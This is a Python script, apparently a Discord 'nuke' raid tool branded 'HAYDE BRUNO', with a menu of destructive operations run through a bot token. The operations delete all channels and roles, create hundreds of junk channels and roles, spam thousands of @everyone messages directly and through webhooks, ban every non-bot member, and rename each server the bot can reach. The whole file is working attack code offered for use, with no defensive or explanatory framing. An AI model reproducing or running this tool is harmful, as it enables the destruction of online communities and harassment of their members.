#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import asyncio
import json
import discord
from discord.ext import commands

RED = '\033[91m'
RESET = '\033[0m'

BRUNO_LOGO = RED + r"""
██╗  ██╗ █████╗ ██╗   ██╗██████╗ ███████╗    ██████╗ ██████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
██║  ██║██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██║   ██║████╗  ██║██╔═══██╗
███████║███████║ ╚████╔╝ ██║  ██║█████╗      ██████╔╝██████╔╝██║   ██║██╔██╗ ██║██║   ██║
██╔══██║██╔══██║  ╚██╔╝  ██║  ██║██╔══╝      ██╔══██╗██╔══██╗██║   ██║██║╚██╗██║██║   ██║
██║  ██║██║  ██║   ██║   ██████╔╝███████╗    ██████╔╝██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
""" + RESET

DEVIL_ASCII = RED + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⠘⢷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⠁⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠙⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⣸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⢀⣤⣤⣴⣶⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⠶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⢹⡄⠀⠀⣠⣴⣿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣤⡀⠀⠀⣰⠇⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠙⠒⠼⣿⣿⢿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⡶⠚⠁⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⠀⠀
⠀⠀⠀⠀⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡏⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⠀
⣾⠀⠀⠀⠈⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⠀⢀⣴
⣿⣧⠀⠀⠀⠸⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⠀⠀⢀⣾⡏
⣿⣿⣷⡀⠀⠀⠹⣿⣆⠀⠀⠀⠀⠀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣶⣿⡿⠟⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃⠀⠀⣠⣿⣿⡇
⣿⡙⢿⣿⣦⡀⠀⠸⣿⣷⣄⣀⠀⠀⣴⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣧⡀⠀⠀⠀⣠⣾⡿⠁⠀⢀⣴⣿⡟⢹⡇
⢹⡇⠀⠻⣿⣿⣆⡀⢸⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠈⠛⠿⢿⣿⣶⣶⣾⣿⣿⠁⢀⣴⣿⣿⠋⠀⢸⠁
⠸⣿⠀⠀⠙⢿⣿⣷⣽⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⢹⣿⣿⣴⣾⣿⠟⠁⠀⠀⣾⠀
⠀⣿⡀⠀⠀⠀⠙⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡿⠋⠀⠀⠀⠀⣿⠀
⠀⠹⣷⠀⠀⠀⠀⠈⣽⣿⣿⣿⣧⠀⠀⠀⠀⠀⠤⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⠦⠀⠀⠀⠀⠀⠀⠀⢻⣿⡏⠀⠀⠀⠀⠀⣰⠃⠀
⠀⠀⢿⣧⡀⠀⠀⠀⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠸⣿⡇⠀⠀⠀⠀⣀⠟⠀⠀
⠀⠀⠀⠙⢿⣦⣀⠀⢹⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡶⠚⠉⠁⠀⠀⠀⣿⡇⠀⠀⢀⡶⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⣠⠶⢻⣿⠁⠀⠀⠀⠀⠀⠀⢸⡇⣀⡴⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠈⠛⢦⣀⣀⣀⣾⠀⠀⠀⠀⣿⣄⣀⣀⡴⠋⠁⢠⣿⠏⠀⠀⠀⠀⠀⠀⠀⣼⡟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⠟⠋⠉⠉⠛⠿⠶⠶⠛⠉⠉⠻⣿⡄⠀⠀⢰⣿⠏⠉⠉⠛⠶⠶⠟⠉⠀⠀⠀⠀⠀⠀⠀⢰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠀⠀⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠀⠀⠻⠀⠀⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + RESET

CONFIG_FILE = "token.json"

def load_token():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            data = json.load(f)
            return data.get('token', '')
    return ''

def save_token(token):
    with open(CONFIG_FILE, 'w') as f:
        json.dump({'token': token}, f)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear()
    print(BRUNO_LOGO)
    print(DEVIL_ASCII)
    print()

def print_menu():
    menu = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              NUKE OPERATIONS                                  ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  1. DELETE ALL CHANNELS        - Remove every channel                        ║
║  2. DELETE ALL ROLES           - Remove every role                           ║
║  3. CREATE CHAOS CHANNELS      - Create 500+ channels                        ║
║  4. CREATE PSYCHO ROLES        - Create 500+ roles                           ║
║  5. MEGA SPAM                  - 7000 messages in ALL channels               ║
║  6. WEBHOOK MEGA SPAM          - Webhooks + 5000 messages each               ║
║  7. BAN ALL MEMBERS            - Ban every member                            ║
║  8. COMPLETE PSYCHO NUKE       - Execute full destruction                    ║
║  9. RENAME SERVER              - Change server name                          ║
║                                                                               ║
║  0. EXIT                                                                      ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
    print(menu)

async def run_action(action_name):
    print_banner()
    
    token = load_token()
    if not token:
        token = input("[?] ENTER BOT TOKEN: ").strip()
        if not token:
            print("[!] NO TOKEN PROVIDED.")
            input("\nPress Enter to continue...")
            return
        save_token(token)
        print("[✓] TOKEN SAVED.")
    else:
        print("[✓] TOKEN LOADED.")
        use_saved = input("[?] USE SAVED TOKEN? (y/n): ").strip().lower()
        if use_saved != 'y':
            token = input("[?] ENTER NEW TOKEN: ").strip()
            if not token:
                print("[!] NO TOKEN PROVIDED.")
                input("\nPress Enter to continue...")
                return
            save_token(token)
            print("[✓] TOKEN UPDATED.")
    
    bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
    
    @bot.event
    async def on_ready():
        print(f"\n[+] LOGGED IN AS: {bot.user}")
        print(f"[+] TARGET SERVERS: {len(bot.guilds)}\n")
        
        for guild in bot.guilds:
            print(f"[*] DESTROYING: {guild.name}")
            
            if action_name == "delete_channels":
                deleted = 0
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        deleted += 1
                        await asyncio.sleep(0.05)
                    except:
                        pass
                print(f"    [✓] DELETED {deleted} CHANNELS")
            
            elif action_name == "delete_roles":
                deleted = 0
                for role in guild.roles:
                    if role.name != "@everyone":
                        try:
                            await role.delete()
                            deleted += 1
                            await asyncio.sleep(0.05)
                        except:
                            pass
                print(f"    [✓] DELETED {deleted} ROLES")
            
            elif action_name == "create_channels":
                created = 0
                for i in range(500):
                    try:
                        await guild.create_text_channel(f"bruno-nuked-{i+1}")
                        created += 1
                    except:
                        pass
                    if i % 50 == 0:
                        await asyncio.sleep(0.01)
                print(f"    [✓] CREATED {created} CHANNELS")
            
            elif action_name == "create_roles":
                created = 0
                for i in range(500):
                    try:
                        await guild.create_role(name=f"bruno-nuked-{i+1}")
                        created += 1
                    except:
                        pass
                    if i % 50 == 0:
                        await asyncio.sleep(0.01)
                print(f"    [✓] CREATED {created} ROLES")
            
            elif action_name == "mass_spam":
                messages = ["@everyone BRUNO WAS HERE", "@everyone HAIDA BRUNO!", "@everyone SYSTEM DESTROYED", "@everyone YOU GOT NUKED"]
                total_sent = 0
                for channel in guild.text_channels:
                    try:
                        for i in range(7000):
                            await channel.send(random.choice(messages) + f" [{i+1}/7000]")
                            total_sent += 1
                            if i % 100 == 0:
                                await asyncio.sleep(0.001)
                    except:
                        pass
                print(f"    [✓] SENT {total_sent} MESSAGES")
            
            elif action_name == "webhook_spam":
                total_webhooks = 0
                total_messages = 0
                for channel in guild.text_channels:
                    try:
                        webhook = await channel.create_webhook(name="BRUNO")
                        total_webhooks += 1
                        for i in range(5000):
                            await webhook.send(random.choice(["@everyone BRUNO NUKE", "HAIDA BRUNO!"]), username="BRUNO")
                            total_messages += 1
                            if i % 100 == 0:
                                await asyncio.sleep(0.001)
                    except:
                        pass
                print(f"    [✓] CREATED {total_webhooks} WEBHOOKS, SENT {total_messages} MESSAGES")
            
            elif action_name == "ban_all":
                banned = 0
                for member in guild.members:
                    if not member.bot:
                        try:
                            await member.ban(reason="BRUNO PSYCHO NUKE")
                            banned += 1
                            await asyncio.sleep(0.1)
                        except:
                            pass
                print(f"    [✓] BANNED {banned} MEMBERS")
            
            elif action_name == "change_server_name":
                try:
                    await guild.edit(name="BRUNO WAS HERE")
                    print(f"    [✓] SERVER RENAMED")
                except:
                    print(f"    [✗] RENAME FAILED")
            
            elif action_name == "complete_nuke":
                print("    [1/7] DELETING CHANNELS...")
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        await asyncio.sleep(0.05)
                    except:
                        pass
                
                print("    [2/7] DELETING ROLES...")
                for role in guild.roles:
                    if role.name != "@everyone":
                        try:
                            await role.delete()
                            await asyncio.sleep(0.05)
                        except:
                            pass
                
                print("    [3/7] CREATING CHAOS CHANNELS...")
                for i in range(500):
                    try:
                        await guild.create_text_channel(f"bruno-nuked-{i+1}")
                    except:
                        pass
                    if i % 50 == 0:
                        await asyncio.sleep(0.01)
                
                print("    [4/7] CREATING PSYCHO ROLES...")
                for i in range(500):
                    try:
                        await guild.create_role(name=f"bruno-nuked-{i+1}")
                    except:
                        pass
                    if i % 50 == 0:
                        await asyncio.sleep(0.01)
                
                print("    [5/7] MEGA SPAM...")
                messages = ["@everyone BRUNO WAS HERE", "@everyone HAIDA BRUNO!", "@everyone SYSTEM DESTROYED"]
                for channel in guild.text_channels:
                    try:
                        for i in range(7000):
                            await channel.send(random.choice(messages) + f" [{i+1}/7000]")
                            if i % 100 == 0:
                                await asyncio.sleep(0.001)
                    except:
                        pass
                
                print("    [6/7] WEBHOOK SPAM...")
                for channel in guild.text_channels:
                    try:
                        webhook = await channel.create_webhook(name="BRUNO")
                        for i in range(5000):
                            await webhook.send(random.choice(["@everyone BRUNO NUKE", "HAIDA BRUNO!"]), username="BRUNO")
                            if i % 100 == 0:
                                await asyncio.sleep(0.001)
                    except:
                        pass
                
                print("    [7/7] BANNING ALL...")
                for member in guild.members:
                    if not member.bot:
                        try:
                            await member.ban(reason="BRUNO PSYCHO NUKE")
                            await asyncio.sleep(0.1)
                        except:
                            pass
                
                try:
                    await guild.edit(name="BRUNO WAS HERE")
                except:
                    pass
                
                print("    [✓] COMPLETE DESTRUCTION FINISHED!")
            
            print()
        
        print("[*] ALL OPERATIONS COMPLETED.")
        await bot.close()
        sys.exit(0)
    
    try:
        await bot.start(token)
    except discord.LoginFailure:
        print("[!] INVALID TOKEN.")
        input("\nPress Enter to continue...")
    except Exception as e:
        print(f"[!] ERROR: {e}")
        input("\nPress Enter to continue...")

def main():
    while True:
        print_banner()
        print_menu()
        
        choice = input("\n[BRUNO] SELECT OPTION: ").strip()
        
        if choice == "1":
            asyncio.run(run_action("delete_channels"))
        elif choice == "2":
            asyncio.run(run_action("delete_roles"))
        elif choice == "3":
            asyncio.run(run_action("create_channels"))
        elif choice == "4":
            asyncio.run(run_action("create_roles"))
        elif choice == "5":
            asyncio.run(run_action("mass_spam"))
        elif choice == "6":
            asyncio.run(run_action("webhook_spam"))
        elif choice == "7":
            asyncio.run(run_action("ban_all"))
        elif choice == "8":
            asyncio.run(run_action("complete_nuke"))
        elif choice == "9":
            asyncio.run(run_action("change_server_name"))
        elif choice == "0":
            print("\n[+] EXITING - HAIDA BRUNO!\n")
            break
        else:
            print("\n[!] INVALID OPTION.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()
